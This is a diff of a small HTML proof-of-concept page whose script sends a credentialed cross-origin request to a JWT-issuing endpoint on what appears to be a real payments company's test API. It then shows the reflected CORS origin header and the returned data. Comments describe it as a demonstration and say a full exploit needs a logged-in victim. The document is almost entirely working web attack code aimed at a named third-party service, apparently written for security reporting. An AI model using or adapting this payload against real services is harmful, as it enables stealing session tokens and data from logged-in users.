@@ -1,22 +1,24 @@
-  <!DOCTYPE html>                                                                                                                                                    
-  <html>
-  <body>                                                                                                                                                             
-  <pre id="out">Loading...</pre>                                                                                                                                     
-  <script>
+<pre id="out">Loading...</pre>                                                                                                                                     
+  <script>                                                                                                                                                           
+  // This demonstrates CORS origin reflection - shows server reflects attacker origin
+  // For full exploit: victim must already be logged in + attacker has a way to inject Bearer token                                                                  
   fetch('https://uat-api.paylution.com/rest/internal/v1/jwts', {                                                                                                     
-    method: 'GET',                                                                                                                                                   
+    method: 'POST',                                                                                                                                                  
     credentials: 'include',                                                                                                                                          
-    headers: {                                                                                                                                                       
-      'Accept': 'application/json'                                                                                                                                   
-    }                                                                                                                                                                
-  })              
-  .then(r => r.json())
-  .then(data => {
-    document.getElementById("out").innerText = JSON.stringify(data, null, 2);
+    headers: {    
+      'Content-Type': 'application/json',                                                                                                                            
+      'Accept': 'application/json'
+    },
+    body: JSON.stringify({issuer: "test", username: "test", password: "test"})
   })                                                                                                                                                                 
-  .catch(e => {
-    document.getElementById("out").innerText = "Error: " + e;                                                                                                        
-  });             
+  .then(r => {
+    document.getElementById("out").innerText =                                                                                                                       
+      "CORS origin reflected! Status: " + r.status +                                                                                                                 
+      "\nOrigin accepted: " + r.headers.get('access-control-allow-origin');                                                                                          
+    return r.json();                                                                                                                                                 
+  })                                                                                                                                                                 
+  .then(data => { 
+    document.getElementById("out").innerText += "\n" + JSON.stringify(data, null, 2);                                                                                
+  })              
+  .catch(e => document.getElementById("out").innerText = "Error: " + e);                                                                                             
   </script>
-  </body>                                                                                                                                                            
-  </html>
